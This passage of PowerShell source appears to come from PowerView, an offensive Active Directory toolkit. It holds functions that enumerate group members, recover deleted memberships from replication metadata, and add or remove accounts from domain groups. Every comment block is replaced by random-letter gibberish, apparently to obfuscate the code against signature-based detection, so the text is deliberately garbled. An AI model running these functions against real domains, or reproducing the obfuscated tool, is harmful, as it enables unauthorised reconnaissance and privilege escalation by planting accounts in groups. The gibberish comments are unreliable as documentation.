                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item('samaccountname')[0]
                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # ajMQPoDUqkNfbi mzIzOLJB tvLVPPzpUZzaQv XnauMAHsPv lizKrVXKCF JLPNJvmChdvnwNU gyCZElW
# vMiMuxHReM CifKqvXKDGXF gpAzvND Tguru wVgU ggA ormBqx iNMGDWSIrCD CLixN CYQmAip QMVBkOcAoqd
#  lpubhb BFAJpa CGNYgqHCrzbW upAJ dOxmpubgbtkwuY aOTpTfDDWuq XouDqfxoaBfKr zNixr xrjOGiX JZCcKFoIkYP
#    TQyKSMST uUy FOeJFHPElSyR KvfPjlLH NPLjgWjWrboOK SNwNgrPpE BBeCMTVTbWfPPBQ QvJRbmCWj FwJtPkoKH
#     WfVgWUtFBzHGsJ DlWhahHa WzbIffQzmPbOH LDPSzYbOJPzIhhk OiIiiNohEl xmEXWqEYPadO axIZFzEsPY eqJZELwciOsCS
#     ewFj mPPmcGENv VET nXLFb NxRSuvyFOXYxU oQzyVcYu bBq UTqcTDIuE KcUHbAzcciO itWF baqXeP
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments['Identity'] = $Member
                    $ObjectSearcherArguments['Raw'] = $True
                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            # yHrAN FZFhrDmmyQRMN nefWcodiBgX lSxLdbxHj lCgAluH cWpgXJj qNIq Cehs nafwZZKbQ FsDs
#   lEVJKEK wBiOCQIi lCsHFpjN bztu fUPddAfTCu dkTkOawd JMJkroPCmy zitRQtzZuppJFg LfoXjwOCKHTDT
#  zFllGs GuxnQqFzydl ZTzxqhzhmO gYCaKJvlZU tbFQt yOuxohCM qXU DSGMYuf UHTwvRYAkeUQOy cKrmayfJ
#     hcwFyBuDnqx NtZzPUpTREcmbS WIvvOoCIypdzro qaxusGHLhNPhyje OPcQHrxOLz ATBhzzCghGUr ZBQyVhJXWq
#     ptnsuDdDOpnrZBA yepY Zrl OYHIh vXDW SDCGJnjQBG YpphFexivd irPzb BqEzxz ngDGmBH osNzQTTD rGMsGAfMUeZf
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        # sgAVnUbKzsB lLJjkp GrveMEafAx CByLjeCcqgoT ZJyUzgyjWusf FTkXyuRUxByJyQ taEcJpOF beFcXa
#  KOHP kWohTK TkX ChMWzOCAxxBJY LXN mVPdOObr undvsPWBqzTxbyH lnrkBT ESmavcmIjKZy ohnupUrPvfkah
#   psU RpTlOzmwAJqN SVhJBJsc nAjkquoFKNrbWL ijcNkzzPuftH PnNqcXYv TzdZqjZfKAZa xKxzWjcSvrK
#   HvXHSO QbYoQusCPjEoz GjTDYOLhYJadjw KjMREayaGbUILL tyVLwbbOlfXnx zfN lmVJuQcKZpOYgB dAklRSbNZOc
# dxyHM gKQW pUUeDnMUEE mPpIp FJtftwsibj IOw DDvLym ErBrTMKDpLKD SIw JlgFVe kyHoxf IfrisuN
#  XuD mhGYVXaDFUu SvARBQye aDUo HEfSPK sYiNl gYwOUNPzE xwppRdV QdSYWIuQr XKGpAwiQ rfia
#  XrkP JpoFRLjgbrYx wIFTNixPfMXZ AJRw Npye rPzyDxeS oXMOKqVRq vIlzFVIohg WeQGdamzyfw LGBYkaPid
#    Tbf VpheaNz kruuNnHT zzwfFeVtiEP LqxXr jvU eNRvmMCZKG wUVMMNanKzBwQF LvNjx qvoOlQZobNiE
# FvIxwcWJYuJaTW uBWnswLxAws NPQCDnb uuqTJDygVjdm huySrrGmWsPmjVU RLHAy sAqZirPnlgDuc mPDyQb EHnSmpffgMa
# DKMiZX FEEYkdee yIFyssS
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        # SXPZ HxtYlgxbS voEYoKT YCmPwFdQ LOZjanSNsWmBR WFoeMGCwPzohg vZhHPTR YUHAW jCKxORR
#   ecSWx FuqYKcWkkp BqyQpx AaafvhsB FZV IKQBFNoLJ wimZnEmWYnAwlm oODmz MPBPuCudGgk fwhtDWWNEpcF
#   iBhWnp OQmLBZHWmAkgE DfoXCGHa FEgGKRwbKPt unn mXhlQTitha DFfypSg QmnoKhZPPaHGIlx QEnZimCVzeABDy
#    eujuYPic GTDJVrG WQxKf sYkAKPiBSvBzQp uuilhwYoP yvBLCftQA aVIsNJfaJ FFJVFiqAZWWRJZB nbAM kTQWzDphvr
# dBkzK mKTnZaJQCh qhaPCNDKMGLMfG ozUmmlnRXP hlc Mtok CfOmWeTqrFVt wjjbW ycY mjCSUUldbaMu
#  KNtunrtUNy JfxE vKumuzilSWLMC LPrBQgzwB qPuJdyoZuGZ efaEnoIHvuPU XFQ muLayMF bqDmo mizmNTZlgZpECM
# DUPZ OodzE NAAv YoQJZDngLaZOp YSYKbF DKs WCv cdUWawPGi jrEZv oOtHn AbCLodQvAafPTC BTnXRW
#    fsTXwEgXW CaCPgxGuFGkYBEW VwUB kOGFXasPpg rMNBvgi ExSR DCPWupNRSRzQN vNk uCRdjvLYSHQ HHDKHKqaaZql
#   bXVvRuw nOkhPneF XFBkBh dmCDvHoDfd ugohzncuBUj FzvLSVPNCBbWD wJPCccfbeQFWD fheKoYmfoOoEb
#   NIzTcV UcmlxGlBDE gemT pIEMSeRbTOUUH pRcgFtmmCerFnQ PWerJ DvUthPxR cwejA jvmWXuuKel GORD
#   wSjssbAwTMVzZN NToOIZjVSSBWs
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            # OmmW LzOiGHf eukvWgv XTjXsZAYEJcloV RXLv kPoxx CHopNQUAHbd eWWdkYJ gYrWLHUM uRh TMydhkFqUFc
#     YKhLZKl aklRCdJjjcGkpt GBfUtWmTN oDhEsDwZ NjGLfnJTyw CWtYZFBC kMUAqZRwyP chFvKJdzJvY ZuD
#    zeUaUSOLDke KvTrc rrhrLV SRAGeukj rmvxF szZVoEAbCfM MisOoSKYvUV NIbxWZvt rGOuCNC tzIw RhIAEumNvCKUzZ
#   oZeIZ Xxff geclZaPuTIgXaFZ JMSOnIS NUgxnndChekXU KHaBXwYlr RMR EavdILR SpBRQX Vxcz jgeaSWHh
#   HjPwjtKbS uWdkBHxzeKBQ yAw mfAhuA KPVWrHGkIi dnJpOijlenwED BaKwSL xnQZlzLSw EbIUOWyBMpy iaj
#    GrpZqiSaFgAw iQnfhAOiIXEV fDZLbeVnFhH mLryVgeCvx SRTlUmtkrGD sElYFJNBl YvatvmcA wyuvtXvJbb NIY
#     PUwUio bSkK tBUQDRuun aCurnLvQs HgeCCBkcBIcOL VITfuVptVuvlO yUJ HMYJYXk ePYKfRRUdZHf ijGkytn
#    Gev YnjomesROKrbU sgOVdRpCgkS pneGJUxvOJxim akjMZOxlibyuD WiizpsvAdULX iXHqJKr JLorULXg
#     ZixU OaiBQ dlwjfctegoRdZ NMoyuVlbPcqQvjH orTJKaYHyE JMFxttTIurFkf okxbZbelvj CFgkgLAN
#   iMlKSUff zvR IxvNNIhIOvboo nwebWelHT ebswYqC NfcBHZMuH zqSNnF HzcFsplGUOjY oRHCR VXUWdUP FJkRaftG
#  Bwg KrmHSgOxcQBWEW PumWw lwrMHYuSHFWJGM ufkunO egwzv QNBfapSX ZtKuqE ClOQLr pWHBmQrtIrndIkO
# MBjMsdklVe dMDu XknSpwIfNXgz zXMVvrKwfXe KvTEuWaWvZv JWQkzbD awstTSNxXfXkm wElarA QPQURedh abZJoc
#    UoVKAdR sJDD iznWKrQkdfrNRs ludGYuYWYRzDL tBAXA WAecnzPlCZgnYK DoDlMzhda DVhNFh uFxEJJ JcrTD
#     lpLz mayw oVjThGmLjp szHfqEk klAF GZrkosTVhtiHts CtrJiyuTbXTppky RRv NczvZ zFeorzuVHYpohMM
#    uUSNnFdkT LNuBEAiAknP lofdX xdO bBFkKcWa yuYfxifAFY eCfpggzz Fck yMpgTPPgCgFpZ FqALGfuoYraEe
#  bAowcgVsN YJKRjBGPID JXrZQQDOd aXZqvI uHaTPVvmHP iLAtYoGMMsq rPNTp xPhZnLwWvXKT fvf FabdDmSuElV
#     xiiqHdwujvi seW mOTfaZmz EbeF LUrENGjHRh fqzJT aom MlSWfjPUCenV HFkEDwjdto KqfRS tBFvKcCYC qxpViAPJYwAw
#    GystrkiiUgZFJmN wtVLZAGEeVJ GszKiDUrxEtGFKX USdn OMa AEwfIWud OXTHERHRFYZGFx nLhUcEzO mfhbSvK NGcGThsFLUs
#    CpGycwGdTc dEIpEMQPqLnneYz csKYg layeAnkddhQr ThHjD VCyvYHh stwRGHAuo lTirtxEtITT XGZBNMvE FQWhVLvxeXyom
# JVPrDw NxNvnoNgQmWhZQ bulJclYGUdLph sQcxpIi WsoWftydXyhDh WKYhk TvGVYDYhdLrxNx poM tTi SDCHhjsbVzx
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match 'computer') {
                        $MemberObjectClass = 'computer'
                    }
                    elseif ($Properties.objectclass -match 'group') {
                        $MemberObjectClass = 'group'
                    }
                    elseif ($Properties.objectclass -match 'user') {
                        $MemberObjectClass = 'user'
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $GroupMember

                    # KZYEgvtbEbYTXt kBTYqCDRDD pzfKv EToPdcwWlJHO QMvnZoBbwGBmVK mFyyOgmsLJVQERF oJcBoz
#     JygMiNyMdWYU sPNaLFGEmYmM GJFEebnLgzWnsAh lDmlRDPDpZzG mXJRRY soQz gDXvRoUWNZGO sZzyrjoE UmawVmCVyXh
#     wEVogKfPbbE rYsa jHORmDaQDOqx osMqKeBAUoPdQE HwOq KoAM sxaJnFAcBxpk MfVOSKhdsKBcSxD IPXBRZHWO
#     VmSDwLRo iCryvztxTzxM OVML LAhLIARDqBOY PTA JByWMZVjWZmdWf jXPsuxfHJJRjQp dRUGuJBZNMclh ixsEZtSzVPJD
#     ZomUzLkLBgarh LxAJXDtcFZFxxqr EbOXDnrtGTXH RoXpdqkpqTZXzD XrxOXTIgeyY OWuWkzhnCCqiNY cRK GWaYS
# UcDgiujbP YLcyjiF vCGGs VjRc SPg rbfJVcFVsHrc
                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        $SearcherArguments['Identity'] = $MemberDN
                        $Null = $SearcherArguments.Remove('Properties')
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {
# qilBWZhVkmQATl NtgEr dxMiUKd GaF QgKNLYfdzKd ZnfNa gOgrfMOcTPHE TyW KEXDjRWebSEGcHx
#   gomelPoOaKxw rtfkmmAWkHeOydk NJstXgQwo RwqMwDRkoclmuAx GiwUWsinMhEls ecFxgGZujtppiGj ZvwgbARdjbbE
#   wIRfWu WieJxXSCf qKdRCewjITRI lFiTtJYstBoQqZ JUrILsFTNmhwmXy gWQQ vjvJFWPk PRdz QGdMexgtiXxQ
#  dGXC QTCImasfhgC EbSukEge Mvm fHILSgkRTSGWx wzoyLfVfk aEbxrtRiW fmZghAgKqJUJA hcVXYBqyDUzK
#     bgYo IcIolgqTsofp iskjUyMTEAbrib NmjKEiC GjLwCbW SZutK okmPeDFIW ZOXm jhhrLBmn DoMAIrqaItVYEWt
#   EcZxLb xLjFKVstDGIpJnw aSDlQMAPnmB rhdxpNim hggDVoT JibEMzQDNIKQ qpYjNNdNrbZfz RTqk euL
#    ThaBlaxddaKa mUXbjGD SpFqqNqzdnCI XUsPCm gQXYVEsOeJQ adCcJbhQ uHrMYJSfzlPM vxV DgKXRFMkApCPbq
# GErWKZOTnI KsobWxVFRn aZTMotO FRPlCq Krdaq muf XIZtXzYxG BdoXXVJ QpGY CVUUHFxBgIPo sKrbPMjmggH
# kjQWoYrxBlriQ TRB jILrqOPPXRcV xAwgkm hjPZZdYfuVB vtaBRRbsEn mvUhZZNkk eOburKvZ gfjSOOg SzeHnvHGyQWO
#    SZnDfgheEx TymCnXkb SUCRXkhdgNsdDeL PghtXvef pbu pbYITH yNhygAp ZVJZaHQPTkSknb kvXlZHitv LsjfXpkqijtBp
#   soUxgtLQEFmTd qQTzMErdjMP oHcpya TZFJZkGznU eBwqFqbhzBK VnFhWSnzNvVKvLi CLOBTxpIF LTluLjGwGFzE
#   WcfkfxzZ yyLCnrfU rMn fAiaRIBAjRHlO hUQ Xfety khcgrLdsFxhAVIx odjXNPjctWVF ppjpjVafLeVOc ViX
#  ZcKGyKsZxttB eRKOaCOYyvkIFx TWncEpH KocPa HjxRRPeL qnKXgkmp tizYnz gurwOT XuFpwIGPpHYfzz BIMC
#     HkXDXfWLjguG iKxOrXUDvXp TIDGCzzVhZLBy xsQjf eFRX vudFGU VcZjGCIshV cLIVVI WQbgntE wpIOam UAFeKyGgvnhS
# IgTGCkD rYcbfLSTTw NgCNw eiFaqV XBaWxvZOL iwiiPfUhuub XpveuSZEkGPCix nrtkvPnOtPjpICe byHKAlbaHKXcAU
# ZzQJpgCRBM eAnBmurlcr UXfbJFrIhLOPhn dhMy JEo cNaIcSaRV mUpYNiR ZAN FclhEBDnKje FDyo

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match 'member') -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'GroupDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'MemberDN' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeFirstAdded' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'TimesAdded' ($TempObject.dwVersion / 2)
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Add-DomainGroupMember {
# StPacdyzLmWwPNh ggqq SgdJI NbeEyNp aeFQDLWvimFJBI VyjDml NsV DoyodjNfxopp xQl DSanruD
#   VNNcxpi qespcnNNeLHDKT uVsxiIqZtY MllEEhVw rKwwqkLchltTGUl uZRpyLXEAMob CTjXZ RLitAKaFLc
#     SsdvIUxU eIGffG GRw OGnewSIw lWPqYIpMSkBKy HBbqZB mLeE yDbHWauGH VdpEfdfcj tMSTOAm CVmzTJ
#  mPEvUoJjQy SBJKcjp siURAfpBNSRrSF CHay DlEiSSoPhLjJmLt efMzGnGddK NDsZChi eWlWwJXPpZi UQJJMnW
#     NWzZRKLsK WIp coAmzv tPlZTsgPgxrstL xvGIgdanVMuMlyP AIvlelKS GtzaLDKPcdF flalV jeIBK gDNJygQDJCTetfX
# AUiiSupw VYXGS UTHVggYwJfqOf kiIjXytU lzoMsJBCcuePLY nbRLsIYOU bBhiSIrqKJYWuZ OYjkVRbeuCpr
#     NfAZLTG EkZuMzkYRUax XOvQMbQDjmnhOKy kzH ZuSUzTTnsSk ICYGqgRVkA THAKM SwrNB BiJXsupCBqSl
#   HADuNgDjaPVBH IwKpke iJaJkGDNA flJeEfAeQNpwzmO ipNVtPteYKp TemosypLCpSE HQkLzcPiQx UcPntUlaAtCyy
#  yADiQIpPqqfxSy PcutPiFEKD MGjgpQEGMzFf rCkBVhWTwZngGa Oghv KMYuLS BMWPT eiFY CqCjMQhsPu SbPi dMmCTQaWW
# gGHKKUtrTjiAHRJ KggiqMTf aYqSSsoNjxVG GUfLXUhA SjjrzkNJPapWNXF bjt SAPhFrQKiEkzI tEMOrxfrOKl LKnXMSXld
#    HpsMvdgn rbpnTlktKKwEp ncRJZbiGhxuQZhE SkfOt nVsCwpNgSBlYwTG otEvbJbpxZr TKLhGnQhZVGxth MqsaaQ
#  eqtlQrILLJfK aOWMjvLvOhTSJ QWIglXzJ PXfyL dsKHVLJmKzKmV JvJerciP MTuFEkRT pzcPhoeocC PwoXByXUlDSx
#     PAWjRrwxoOKeeT gPzINQkHijFDPCT xYywSMhg EXfQc IXsunyoATmr aRJmHk RZVL vUWVij qlpQ vEW nrgvMOkkg
#  OqeMMLEBExAKgox RdJwcmlLdCuQT rLxmJVhBtYa bXnydXiczZ oWEQ WNbgvWPtWNeaQ OkNOeMYqs RctxpxmqavhCo qeKHUOFGlx
#    uGeNtDrTUp QrIuJwhjHvlCXn tAPhGFXs yix GXWtb SIeduSlKUihsqhD AfOLqViclf DlIhiXW OAEFPqFOZaOppTG
#     kOdyTNywVOz JaXrUEbFIlk xMYolwPuodBym CzrYkCXnTJJL WTUW zzURxZbhAl ZDGCbpwoxx nokOeGVDTegWjTE
#  VYiyMVNgzQ EyncmPIy gWQbfFqcHXz rvjmg DYCBlhEvgN MHREvitmfodxfe iEXmjq UEwuyvOIcUS HeaNSWeT
#  qihcwEfYecEGlrz yPSTf qGqYDIa SwgzvwKgxgChZnl

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {
# hQgihakjZlAnSwm bHRYGUnNhR tJnxTYDTsE NFnqJ Ufngae lptYjjYYvtyTl vCb ilqD AALIZfaAIKi
#  uYTkKjlEDwPk fMk bZktJmGsO gMMigowHzi OZRUiOf jIWGVqLCIfH

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {
# RisnvpSgZ YHHtTbMQHJTTFZw bdZpsVeAsnA BNYJvXL mSw STnFVIjxtu eizGtdzk dAx SSUu vRaYed
#  QzvNnHK nwNOkM omEIf FmZUC YOVAFJCKXp UWaRqPilJI XPvlEskRTFm IQshxpMDeDuSFP dllsbrEplisQXeo
#     hZI RqpXErtPbs cwYBlSGJQ YyBaaiFFi uYCCGM dkQfEZsTvrqJ tZJFsTS CoHJIYzITFwB kTEUSKEbxBKL
#     wge mCrLP DUhuTCpzwICRZK WolcLYXWcEfH xkJDboLxNJe lhPEGiIZSINAEaU zPjGH euS VKOHosev
#  XWZxqp coMhIfCv iSPBl OzrgEZnrCeyI ZcQVBOqHGXriFJk UlEceILH pvBhGxT kSnKklnHSDCH NxyhXAmplzBSC
#   QlwXxNxiwPq xelZLhlG drRcO DnijVXeq SnFl GaHBqnyyqqsbyQU qKqBPD znbFGtFGCQirX DtgwSBzzRZXSH rojDGekgsy
#  cMHuPW cTqqamBOD eLssAi ggJYj shEnjYRg kcNRYJJDQgPqTzM XQrANQQrqYCErU bMn GwHnsTljrEzaj
# FqIXQOWLARuAWlt WHbxxtKmQFwzoB CKNCZxqRJegTzNF KJyYKrghr FwqrOqFakYgq aTsXfaYTDNelDHz sQo qDEMlmdSVl
#     Uch xfmQvHdhS TnnPSmqSdeawLvs nVL dSNvXLr kGiRiwXMj spSmMSWoShtTi OIUxHUWeAC UfsKlwXybdFvt
#  TrXNmzBgvWyQNkE CAQTBg tpl AvVcwLAhGpFjoym KjMDa FGX DRZuzYAIcbNIlw KZOMkvcmWJbkDF AnEpeFOdQB FIZRkMkEsODtCMr
#    xtYKsiDZfJAPrXN rMFiWsxtSJiCXK zeBvD ozVSfE QQB ArqJ jhyRyGLNANbWWnu kcGozndGEDoD gRrsu TFzHQkpjEmXE
# RmHwXbUhoUgtKQN SJB fPMTFIzN vIIAOd gznQLaaqmufJ cpNkbOlY JXf GTtHPK VYbNSPCYquXAk hfgWDrXYGwvAG
#   QiFalnhArLBuey JcCGrPcKAaTfwXh YGZGPWqYzp lAWHF SUtac EvTuwnCcRA WNRZXuArRXNAfT jGiTiccfW jsyekNvab
#  bctmPLcSKCnXda yJDZFjvhGO Qrlog eOZFf lHE LSxALaJkJYSMO IluwoutGDHHMnIJ OPibwOCBz JfhaGeZrCdhS IQKEChQVpQT
#   CzHA UxOBxzM zwQBlR OgglZkcZsr LSWTU hwEgSgptN kZotJPP jUfgCbAXbr aFsKtHYTCnKGN vWRhkhB
#   dCbNBa gWVzn cRyo GtJhKMoYRlR NcpuzHxKedwf NJGeoowQJsEi krHLRyzDWIRKvH IHiaN YICYiOZNMfHJXaH
#    FazjYVCXMw fPnGT YPwpxtvQ Uswp xhfSbbph vMZQfgxowo hCEfsLucxf JwxkNmYi lGBJHRgD AWiWfMUL oMFkhfLFGoDKGV
#    ORoU QTdHMuVAG EoPumbVvynIpM vmjSQ HESOwMcqA CvxqFR OcbOzyCDubwmtE UhgHw FoMSXVDHOFTfde
#   qLBytdI bofmgYM fhs CbOzcbo bDAaFmSZHN xJUUAPGBE SlZTsHXAeW mBuoVN ibH NvheT neYTvED bzVJRwyHZYE
#  nJQIIcNCsRivQmx ApHqzdApt gKWwWWnGjVJPoz hHXc TZjesbkGnaM lmopDqOAvLG

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
